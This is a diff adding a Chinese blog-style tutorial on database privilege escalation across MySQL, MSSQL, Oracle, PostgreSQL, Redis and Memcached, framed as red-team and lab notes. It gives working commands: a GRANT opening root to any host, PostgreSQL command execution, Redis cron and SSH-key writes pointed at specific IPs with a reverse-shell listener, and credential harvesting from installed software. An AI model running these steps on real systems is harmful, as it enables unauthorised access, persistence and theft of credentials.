@@ -1,0 +1,213 @@
+---
+title: "3.数据库提权全攻略：MySQL、MSSQL、Oracle 及 Redis 深度利用"
+slug: database-privilege-escalation-guide
+cover: ""
+date: 2026-01-09
+categories:
+  - 权限提升
+tags:
+  - 数据库提权
+  - UDF
+  - Redis未授权
+  - SQL_Server
+halo:
+  site: http://www.hzhsec.top
+  name: d64538c2-a11a-4c47-8eb8-5376da3fcd04
+  publish: true
+---
+
+# 简介
+
+本文总结数据库提权的完整流程，包括数据库凭据获取方法、外联开启、提权方式、利用工具、适用场景及相关命令。  
+内容适用于 Web 实战、靶场、红队、应急响应及面试知识点整理。
+
+---
+
+# 数据库提权流程
+
+## 1. 获取数据库用户密码
+
+常见凭据获取方式：
+
+- 网站存在 SQL 注入漏洞
+- 数据库存储文件或备份文件泄露
+- 网站源码配置文件泄露（如 config.php / application.yml）
+- 外联爆破（需提前解决访问限制）
+
+> 注：如果数据库不存在远程访问权限，可以通过 WebShell 本地连接或端口代理方式绕过。
+
+---
+
+## 2. 利用数据库提权项目连接
+
+可使用以下开源提权辅助工具进行数据库连接、操作或执行系统命令：
+
+| 工具名称        | 说明                   | 项目地址                                     |
+| --------------- | ---------------------- | -------------------------------------------- |
+| MDUT            | 常用数据库利用工具集成 | https://github.com/SafeGroceryStore/MDUT     |
+| Databasetools   | 数据库渗透集成工具     | https://github.com/Hel10-Web/Databasetools   |
+| RequestTemplate | 请求模板与利用框架     | https://github.com/1n7erface/RequestTemplate |
+
+---
+
+## 3. 建立代理解决外联限制
+
+两种典型方法：
+
+- 利用 **已拥有 Web 权限** 建立代理 → 数据库等同于 **本地连接**  
+- 利用权限执行 SQL 开启外联 → 让数据库支持远程访问  
+
+例如可使用：reGeorg、Neo-reGeorg、frp、chisel、socks5 tunnel 等。
+
+---
+
+# 各类数据库提权方法与命令
+
+## 1. 开启外联
+
+
+### MySQL
+```mysql
+GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'v3nSecurity' WITH GRANT OPTION;
+flush privileges;
+```
+
+### MSSQL
+
+```sql
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
+RECONFIGURE;
+```
+
+### Oracle
+
+```sql
+ALTER SYSTEM SET REMOTE_LOGIN_PASSWORDFILE=EXCLUSIVE SCOPE=SPFILE;
+SHUTDOWN IMMEDIATE;
+STARTUP;
+```
+
+---
+
+## 2. 数据库类型提权技术总结
+
+### MySQL（3306）
+
+* **适用场景**：PHP + MySQL 以 Web 入口提权
+* **条件**：可获取 root 密码（高版本需注意 `secure-file-priv` 限制）
+* **提权技术**：UDF、MOF、启动项、反弹 Shell
+
+---
+
+### MSSQL / SQL Server（1433）
+
+* **适用场景**：ASP.NET、Web API、企业内部系统
+* **条件**：sa 权限
+* **提权技术**：xp_cmdshell / sp_oacreate / CLR / 沙盒逃逸
+
+---
+
+### Oracle（1521）
+
+* **适用场景**：大型企业、政府、金融系统、多站库分离架构
+* **条件**：数据库用户密码
+* **利用方式**：DBA / 普通用户 / 注入模式
+* **说明**：Oracle 具备多种系统级命令执行间接路径，但通常需突破权限层级
+
+---
+
+### PostgreSQL（5432）
+
+* **条件**：数据库用户密码
+* **核心利用点**：支持通过 `COPY FROM PROGRAM` 执行系统命令
+* **示例利用代码**：
+
+```sql
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+```
+
+---
+
+### Redis（6379）
+
+* **方向**：数据库 → Linux 服务器
+* **条件**：未授权访问或成功登录
+* **适用只限 Linux（如课程 Day78 提及）**
+* **利用技术**：写 SSH 公钥、写计划任务、反弹 Shell、CVE 沙盒执行
+* **工具**：[https://github.com/yuyan-sec/RedisEXP.git](https://github.com/yuyan-sec/RedisEXP.git)
+
+#### 复现环境搭建
+
+```
+wget http://download.redis.io/releases/redis-2.8.17.tar.gz
+tar xzf redis-2.8.17.tar.gz
+cd redis-2.8.17
+make
+cd src
+./redis-server
+```
+
+#### 写入计划任务示例
+
+```
+RedisEXP_windows_amd64.exe -m cron -r 113.45.220.185 -L 118.178.86.67 -P 5432
+```
+
+#### 写入 SSH 密钥示例
+
+1. 创建密钥
+
+```
+ssh-keygen
+(echo -e "\n\n";cat id_rsa.pub;echo -e "\n\n") > 1.txt
+cat 1.txt
+```
+
+2. 利用工具写入
+
+```
+RedisEXP_windows_amd64.exe -m ssh -r 113.45.220.185 -u root -s "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCQyB/pMfxpZbcuReiqglyxTRgjSvzyBfhzApVtFCy+AObFxaHYomAouZPSGlJ/LDAUt14+j3elFewlF9r/qXpA3elZ4Dm+cD3C6LU/jFgt7bSW5H5FM2xfiDgvKi9kwTdFSCoFlN/2Cm1KmazAFP455sw4Rf+ag17CzQWdJTD8yT/wq8vbUE0rFgU8S450Nvzai2lllPNPOOciq7EA37hg5QE+0w1zw2ZBJEy6EqqZiHjctM27UWgkPAhFX8eyaeMUaBO46LLPA2FCHHyDyq4ARkkoa7quB2FTBBXxnCXmTVxcO/s4JXC9yoChBmMDxIlkaLpHnQE9lKU2dcpT8fJyaEiwIPSbzV94VMM/5m9e+7+ue1a1KFW+NCDyoeAm9hWsQfmg3ej/hyHnw95mcO/pXaRb69gXgqM2nCp+XiAMS1Rp8K4zJuppULvD75Cj/hGWgniU2hnfb4pcnaQGLQk4wwt4UvuCLdeTsJdDzKyTDQk9i0cfxnhK6Zu7l13DpuE= dream@win"
+```
+
+---
+
+### Memcached（11211）
+
+* **方向**：数据库 → Linux
+* **条件**：远程可访问或本地访问
+* **说明**：无权限控制模块，可直接读写敏感内容
+* **案例参考**：[https://mp.weixin.qq.com/s/V_p1heyM-2HxsaFLRs9qeg](https://mp.weixin.qq.com/s/V_p1heyM-2HxsaFLRs9qeg)
+
+---
+
+# 第三方软件提权
+
+### 可利用软件类别
+
+| 类别   | 示例                                    |
+| ------ | --------------------------------------- |
+| 远控类 | Teamviewer、向日葵、Todesk、VNC、Radmin |
+| 密码类 | 各类浏览器、Xshell、Navicat、3389       |
+| 服务类 | FileZilla、Serv-U、Zend                 |
+| 文档类 | WinRAR、WPS Office                      |
+
+### 原理总结
+
+1. 利用普通用户或 Web 用户收集、导出系统凭据进行权限提升
+2. 上传恶意文档或可执行文件，等待管理员触发执行（社工 + 权限继承）
+
+### Cobalt Strike 典型利用场景
+
+| 条件                  | 利用方式        |
+| --------------------- | --------------- |
+| 计算机用户            | Teamviewer      |
+| 计算机用户            | NavicatPremium  |
+| 计算机用户 / Web 权限 | Winrar(CVE2023) |
+| 计算机用户            | 浏览器密码凭据  |
+
+---
